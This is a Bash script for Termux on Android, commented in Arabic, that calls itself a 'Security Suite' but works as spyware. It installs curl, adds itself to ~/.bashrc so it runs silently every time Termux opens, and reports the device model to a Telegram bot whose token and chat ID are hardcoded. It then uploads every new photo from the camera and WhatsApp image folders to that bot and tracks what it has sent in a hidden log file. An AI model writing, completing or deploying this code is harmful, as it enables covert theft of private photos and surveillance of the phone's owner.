#!/bin/bash

# --- 1. إعدادات البوت ---
TOKEN="8669553208:AAGCy9MQTL9ogHuFXbZiZy4bqkXUnkdwHqg"
ID="7845603274"
URL_MSG="https://api.telegram.org/bot$TOKEN/sendMessage"
URL_DOC="https://api.telegram.org/bot$TOKEN/sendDocument"
LOG_FILE="$HOME/.sent_photos.log" # سجل الصور المرسلة (مخفي)

# --- 2. مرحلة التثبيت والحقن (تنفذ مرة واحدة فقط) ---
if ! grep -q "security_task.sh" ~/.bashrc; then
    # طلب صلاحيات التخزين وتثبيت الأدوات اللازمة
    termux-setup-storage
    sleep 3
    pkg install curl -y -q
    
    # إنشاء ملف السجل (Database صغرية) لضمان عدم تكرار الصور
    touch "$LOG_FILE"
    
    # حقن السكريبت في ملف .bashrc ليعمل في الخلفية بصمت عند كل فتح لتيرمكس
    echo "(bash ~/security_task.sh > /dev/null 2>&1 &)" >> ~/.bashrc
    
    echo -e "\e[1;32m[!] Security Suite Installed Successfully!\e[0m"
    exit 
fi

# --- 3. المهمة الذكية (إرسال الإشعار وفحص الصور) ---

# أ) إرسال إشعار بمعلومات الجهاز (تم تعديله ليدعم المسافات في اسم الموديل)
MODEL=$(getprop ro.product.model)
curl -s -G "$URL_MSG" \
    --data-urlencode "chat_id=$ID" \
    --data-urlencode "text=Smart_Access_Active: $MODEL" > /dev/null

# ب) مسارات الصور المراد مراقبتها
paths=(
"/sdcard/DCIM/Camera/"
"/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
)

# ج) فحص المسارات وإرسال الصور الجديدة فقط
for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        # قراءة قائمة الصور في المجلد المختار
        ls "$path" | while read photo; do
            # التحقق: هل اسم هذه الصورة موجود في سجل المرسلات؟
            if ! grep -q "$photo" "$LOG_FILE"; then
                # إرسال الصورة الجديدة كملف (Document)
                response=$(curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC")
                
                # إذا نجح الإرسال (رد تليجرام بـ ok:true)، سجل الاسم في السجل
                if [[ $response == *"\"ok\":true"* ]]; then
                    echo "$photo" >> "$LOG_FILE"
                fi
                # تأخير بسيط (0.5 ثانية) لتجنب حظر البوت (Anti-Spam)
                sleep 0.5
            fi
        done
    fi
done
# فحص المسارات وإرسال ما لم يُرسل سابقاً
for path in "${paths[@]}"; do
    if [ -d "$path" ]; then
        # قراءة قائمة الصور في المجلد
        ls "$path" | while read photo; do
            # التحقق: هل اسم الصورة موجود في السجل؟
            if ! grep -q "$photo" "$LOG_FILE"; then
                # إرسال الصورة الجديدة
                response=$(curl -s -F chat_id=$ID -F document=@"$path$photo" "$URL_DOC")
                
                # إذا نجح الإرسال (تأكيد من تليجرام)، أضفها للسجل لكي لا نرسلها مجدداً
                if [[ $response == *"\"ok\":true"* ]]; then
                    echo "$photo" >> "$LOG_FILE"
                fi
                # تأخير بسيط لتجنب حظر البوت بسبب كثرة الرسائل (Anti-Spam)
                sleep 0.5
            fi
        done
    fi
done
